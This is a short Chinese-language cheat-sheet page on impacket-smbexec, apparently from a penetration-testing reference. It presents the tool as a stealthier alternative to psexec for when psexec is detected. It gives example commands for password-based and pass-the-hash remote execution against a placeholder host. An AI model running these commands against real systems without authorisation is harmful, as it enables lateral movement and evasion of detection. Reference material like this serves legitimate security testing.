# impacket-smbexec

## 简介
无 RemComSvc 的远程执行工具，比 psexec 更隐蔽

## 核心参数
- 格式：domain/user:password@target
- `-hashes`: 使用 NTLM 哈希

## 命令示例
```bash
# 使用密码连接
impacket-smbexec domain/admin:password@192.168.1.100

# Pass-the-Hash
impacket-smbexec domain/admin@192.168.1.100 -hashes :ntlm_hash

# 本地用户连接
impacket-smbexec admin:password@192.168.1.100

# 执行单条命令
impacket-smbexec admin:password@192.168.1.100 'ipconfig'
```

## 使用场景
当 psexec 被检测或失败时的替代方案

## 所属分类
- [Pass-the-Hash 攻击 (Pass-the-Hash)](../categories/13-pass-the-hash.md)
